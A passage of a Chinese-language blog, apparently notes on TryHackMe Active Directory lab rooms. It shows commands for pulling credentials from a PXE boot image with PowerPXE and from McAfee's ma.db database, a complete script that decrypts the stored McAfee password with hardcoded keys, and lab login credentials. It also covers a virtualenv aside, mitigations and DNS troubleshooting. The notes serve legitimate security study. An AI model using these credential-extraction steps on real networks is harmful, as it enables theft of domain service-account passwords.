#98C379">GET</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\Tmp\x64{0620E466-5D23-4890-A8C2-3E89E9A4E777}.bcd&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">conf.bcd</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 进入 PowerShell 环境</span></span><span class="line"><span style="color: #61AFEF">powershell</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-executionpolicy</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">bypass</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 载入 PowerShell 脚本</span></span><span class="line"><span style="color: #61AFEF">Import-Module</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">owerPXE.ps1</span></span><span class="line"><span style="color: #E06C75">$BCDFile</span><span style="color: #ABB2BF"> = </span><span style="color: #98C379">&quot;conf.bcd&quot;</span></span><span class="line"><span style="color: #61AFEF">Get-WimFile</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-bcdFile</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$BCDFile</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">&gt;&gt; Parse the BCD file: conf.bcd</span></span><span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">Identify</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">wim</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">file</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">:</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\B</span><span style="color: #98C379">oot</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">64</span><span style="color: #56B6C2">\I</span><span style="color: #98C379">mages</span><span style="color: #56B6C2">\L</span><span style="color: #98C379">iteTouchPE_x64.wim</span></span><span class="line"><span style="color: #61AFEF">\Boot\x64\Images\LiteTouchPE_x64.wim</span></span></code></pre></div></div></figure><p>这里找到了一个启动镜像文件，下载下来然后用 PowerPXE 脚本提取信息，或者可以手动解包镜像之后找到 <code>bootstrap.ini</code> 查看。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">tftp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.200</span><span style="color: #98C379">.20.202</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">GET</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\Boot\x64\Images\LiteTouchPE_x64.wim&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pxeboot.wim</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-v</span></span><span class="line"><span style="color: #61AFEF">Get-FindCredentials</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-WimFile</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pxeboot.wim</span></span><span class="line"><span style="color: #ABB2BF">&gt;&gt; Open pxeboot.wim</span></span><span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">Finding</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Bootstrap.ini</span></span><span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">DeployRoot</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\\</span><span style="color: #98C379">THMMDT</span><span style="color: #56B6C2">\M</span><span style="color: #98C379">TDBuildLab</span><span style="color: #ABB2BF">$</span></span><span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">UserID</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> &lt;</span><span style="color: #98C379">accoun</span><span style="color: #ABB2BF">t&gt;</span></span><span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">UserDomain</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ZA</span></span><span class="line"><span style="color: #ABB2BF">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; </span><span style="color: #61AFEF">UserPassword</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> &lt;</span><span style="color: #98C379">passwor</span><span style="color: #ABB2BF">d&gt;</span></span></code></pre></div></div></figure><p>关于 PXE 提取信息相关可以看这个：<a href="https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/">https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/</a></p><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>这个也是老生常谈了，也是信息收集技能的一环，文章提到了以下几个地方可能会存着凭据。</p><ul><li>Web 应用程序配置文件</li><li>服务配置文件</li><li>注册表</li><li>集中部署的应用程序</li><li><strong>浏览器</strong></li></ul><p>另外也可以用这个自动化工具 <a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> 去提取。</p><h2 id="从迈克菲杀毒中提取凭据"><a href="#从迈克菲杀毒中提取凭据" class="headerlink" title="从迈克菲杀毒中提取凭据"></a>从迈克菲杀毒中提取凭据</h2><p>McAfee 在安装过程中，会将用于连接回其管理服务器的<strong>凭据嵌入在一个名为 <code>ma.db</code> 的文件中</strong>。拥有本地主机访问权限后，可以检索并读取这个数据库文件，从而<strong>恢复相关的 AD 服务账户</strong>。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">cd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">C:</span><span style="color: #56B6C2">\P</span><span style="color: #98C379">rogramData</span><span style="color: #56B6C2">\M</span><span style="color: #98C379">cAfee</span><span style="color: #56B6C2">\A</span><span style="color: #98C379">gent</span><span style="color: #56B6C2">\D</span><span style="color: #98C379">B</span></span><span class="line"><span style="color: #61AFEF">dir</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 通过 SCP 把文件传到本地</span></span><span class="line"><span style="color: #61AFEF">scp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 打开迈克菲的 SQLite 数据库</span></span><span class="line"><span style="color: #61AFEF">sqlitebrowser</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ma.db</span></span></code></pre></div></div></figure><p>打开 <strong>AGENT_REPOSITORIES</strong> 表，提取加密后的密码，用下面这个脚本解密。</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#!/usr/bin/env python</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># Info: </span></span><span class="line"><span style="color: #7F848E; font-style: italic">#    McAfee Sitelist.xml password decryption tool</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#    Jerome Nokin (@funoverip) - Feb 2016</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#    More info on https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># Quick howto: </span></span><span class="line"><span style="color: #7F848E; font-style: italic">#    Search for the XML element &lt;Password Encrypted=&quot;1&quot;&gt;...&lt;/Password&gt;,</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#    and paste the content as argument.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">#</span></span><span class="line"><span style="color: #7F848E; font-style: italic">###########################################################################</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> sys</span></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> base64</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 原脚本是用的 Cryptodome</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># https://pypi.org/project/pycryptodome/</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 从这里看的话，pycryptodome 包安装之后是在 Crypto 底下的</span></span><span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> Crypto.Cipher </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">DES3</span></span><span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> Crypto.Hash </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">SHA</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># hardcoded XOR key</span></span><span class="line"><span style="color: #D19A66">KEY</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">bytearray</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">fromhex</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;12150F10111C1A060A1F1B1817160519&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;utf-8&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">sitelist_xor</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66; font-style: italic">xs</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF">    result </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">bytearray</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> i, c </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">enumerate</span><span style="color: #ABB2BF">(xs):</span></span><span class="line"><span style="color: #ABB2BF">        cb </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> c.</span><span style="color: #61AFEF">to_bytes</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">byteorder</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;big&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">        result </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(cb) </span><span style="color: #56B6C2">^</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">KEY</span><span style="color: #ABB2BF">[i</span><span style="color: #56B6C2">%</span><span style="color: #D19A66">16</span><span style="color: #ABB2BF">])).</span><span style="color: #61AFEF">to_bytes</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">byteorder</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;big&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> result</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">des3_ecb_decrypt</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66; font-style: italic">data</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># hardcoded 3DES key</span></span><span class="line"><span style="color: #ABB2BF">    key </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">SHA</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">new</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">b</span><span style="color: #98C379">&#39;&lt;!@#$%^&gt;&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">digest</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">bytearray</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">4</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># decrypt</span></span><span class="line"><span style="color: #ABB2BF">    des3 </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">DES3</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">new</span><span style="color: #ABB2BF">(key, </span><span style="color: #D19A66">DES3</span><span style="color: #ABB2BF">.</span><span style="color: #D19A66">MODE_ECB</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    data </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">bytearray</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">64</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(data) </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">64</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #ABB2BF">    decrypted </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> des3.</span><span style="color: #61AFEF">decrypt</span><span style="color: #ABB2BF">(data)</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> decrypted[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">:decrypted.</span><span style="color: #61AFEF">find</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)] </span><span style="color: #C678DD">or</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&lt;empty&gt;&quot;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">__name__</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;__main__&quot;</span><span style="color: #ABB2BF">:</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(sys.argv) </span><span style="color: #56B6C2">!=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Usage:   </span><span style="color: #D19A66">%s</span><span style="color: #98C379"> &lt;base64 passwd&gt;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> sys.argv[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">])</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Example: </span><span style="color: #D19A66">%s</span><span style="color: #98C379"> &#39;jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==&#39;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> sys.argv[</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">])</span></span><span class="line"><span style="color: #ABB2BF">        sys.</span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># read arg</span></span><span class="line"><span style="color: #ABB2BF">    encrypted_password </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> base64.</span><span style="color: #61AFEF">b64decode</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">bytes</span><span style="color: #ABB2BF">(sys.argv[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">], </span><span style="color: #98C379">&quot;utf-8&quot;</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># decrypt</span></span><span class="line"><span style="color: #ABB2BF">    passwdXOR </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">sitelist_xor</span><span style="color: #ABB2BF">(encrypted_password)</span></span><span class="line"><span style="color: #ABB2BF">    password </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">des3_ecb_decrypt</span><span style="color: #ABB2BF">(passwdXOR).</span><span style="color: #61AFEF">decode</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;utf-8&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># print out</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Crypted password   : </span><span style="color: #D19A66">%s</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> sys.argv[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Decrypted password : </span><span style="color: #D19A66">%s</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> password)</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">    sys.</span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><p>python 这个环境不太明白，我在 Kali 中安装包老是提示要我加 <code>--break-package-system</code></p><p>看了这个帖子 <a href="https://www.reddit.com/r/linux4noobs/comments/1f9s3g0/is_it_bad_to_use_pip_install_breakpackagesystem/">Is it bad to use pip install –break-package-system?</a> 发现确实不行，系统有一部分是依赖那些包的，如果升级或者安装把包搞挂了，系统也炸了，解决办法是用虚拟环境来解决，不太懂怎么用，之后去学学。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 如果提示缺库，安装这个</span></span><span class="line"><span style="color: #61AFEF">py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pycryptodome</span></span><span class="line"></span><span class="line"><span style="color: #61AFEF">py</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">mcafee_sitelist_pwd_decrypt.py</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==</span></span></code></pre></div></div></figure><h3 id="DLC-Python-虚拟环境"><a href="#DLC-Python-虚拟环境" class="headerlink" title="DLC - Python 虚拟环境"></a>DLC - Python 虚拟环境</h3><p><strong>虚拟环境（Virtual Environment）</strong> 是一个独立、隔离的 Python 运行环境。它的核心思想是：</p><ol><li><strong>隔离性：</strong> 每个虚拟环境都有自己独立的 Python 解释器、<code>pip</code> 工具和 <code>site-packages</code> 目录。</li><li><strong>互不干扰：</strong> 当你在一个虚拟环境中安装包时，这些包只会安装到这个虚拟环境的 <code>site-packages</code> 目录中，<strong>不会影响到系统全局的 Python 环境</strong>。</li><li><strong>项目专用：</strong> 你可以为每个 Python 项目创建一个独立的虚拟环境，这样不同项目之间所需的依赖库版本就不会冲突。</li></ol><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 建立项目目录</span></span><span class="line"><span style="color: #61AFEF">mkdir</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">my_project</span></span><span class="line"><span style="color: #56B6C2">cd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">my_project</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 创建虚拟环境</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这个命令会在当前目录下创建一个名为 YOUR_venv_NAME 的子目录</span></span><span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">venv</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">YOUR_venv_NAME</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 激活虚拟环境</span></span><span class="line"><span style="color: #56B6C2">source</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">venv/bin/activate</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 安装依赖，会安装到虚拟环境中，而不会安装到系统全局的 Python</span></span><span class="line"><span style="color: #61AFEF">pip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">requests_ntlm</span></span><span class="line"><span style="color: #61AFEF">pip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">pycryptodome</span></span></code></pre></div></div></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>AD 的攻击面非常大，可以从以下几个方面去缓解：</p><ul><li>培训用户意识</li><li>控制 AD 服务暴露面<ul><li>不要暴露在外网，仅在内网可访问并且启用 MFA 的 VPN</li></ul></li><li>启用 NAC 网络访问控制</li><li>强制 SMB 签名</li><li>遵守最小权限原则</li></ul><hr><h1 id="Enumerating-Active-Directory"><a href="#Enumerating-Active-Directory" class="headerlink" title="Enumerating Active Directory"></a>Enumerating Active Directory</h1><p>这一个房间其实是讲信息收集的，从很多个面，很多种方法去收集信息</p><p>根据房间去设置好网卡的 DNS 后，去获取一组凭据。</p><ul><li>rachael.atkinson</li><li>Password: Zjqf3489</li></ul><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">ssh</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">za.tryhackme.com</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">rachael.atkinson@thmjmp1.za.tryhackme.com</span></span></code></pre></div></div></figure><h2 id="凭据注入"><a href="#凭据注入" class="headerlink" title="凭据注入"></a>凭据注入</h2><p>这里用到的是 <code>Runas.exe /netonly</code> ，刚开始不明白他的作用是什么，以为是以域上的用户的权限去执行程序的，实际上是用提供的域和凭据<strong>注入一个临时的应用程序</strong>，之后执行的<strong>网络操作</strong>都用的这个凭据去执行。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">runas.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF">\rachael.atkinson cmd.exe</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">dir</span><span style="color: #ABB2BF"> \\za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">SYSVOL</span><span style="color: #ABB2BF">\</span></span></code></pre></div></div></figure><img src="/thm_ad/image-20250802133134659.png" class="" title="image-20250802133134659"><p>可以看到标题栏有 <strong>作为 xxxx 运行</strong> 的提示。</p><h3 id="DNS-解析不到域控"><a href="#DNS-解析不到域控" class="headerlink" title="DNS 解析不到域控"></a>DNS 解析不到域控</h3><p>实际上是一个 Windows 下的优先级的问题，因为我外网网卡的跃点数比 OpenVPN 网卡的接口跃点数大，所以 DNS 优先用外置网卡的 DNS 去查询，当然查不到结果。通过调小 OpenVPN 的网卡的跃点数解决。</p><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># NS 手动查询 DNS</span></span><span class="line"><span style="color: #ABB2BF">nslookup za.tryhackme.com</span></span><span class="line"><span style="color: #ABB2BF">服务器:  </span><span style="color: #D19A66">10.1.2.1</span></span><span class="line"><span style="color: #ABB2BF">Address:  </span><span style="color: #D19A66">10.1.2.1</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">*** </span><span style="color: #D19A66">10.1.2.1</span><span style="color: #ABB2BF"> 找不到 za.tryhackme.com: </span><span style="color: #E06C75">Non</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">existent</span><span style="color: #ABB2BF"> domain</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 查看系统内 DNS</span></span><span class="line"><span style="color: #ABB2BF">netsh interface ip show dns</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 查看接口跃点数</span></span><span class="line"><span style="color: #ABB2BF">netsh interface ipv4 show interface</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">Idx     Met         MTU          状态                名称</span></span><span class="line"><span style="color: #ABB2BF">---  ----------  ----------  ------------  ---------------------------</span></span><span class="line"><span style="color: #ABB2BF"> </span><span style="color: #D19A66">13</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">25</span><span style="color: #ABB2BF">        </span><span style="color: #D19A66">1500</span><span style="color: #ABB2BF">  connected     本地连接 </span><span style="color: #D19A66">2</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #D19A66">7</span><span style="color: #ABB2BF">          </span><span style="color: #D19A66">20</span><span style="color: #ABB2BF">        </span><span style="color: #D19A66">1500</span><span style="color: #ABB2BF">  connected     以太网 </span><span style="color: #D19A66">7</span></span><span class="line"><span style="color: #ABB2BF">  </span></span><span class="line"><span style="color: #ABB2BF"># 调小跃点数后查询 DNS 解析</span></span><span class="line"><span style="color: #ABB2BF">nslookup thmjmp1.za.tryhackme.com</span></span><span class="line"><span style="color: #ABB2BF">DNS </span><span style="color: #E5C07B">request</span><span style="color: 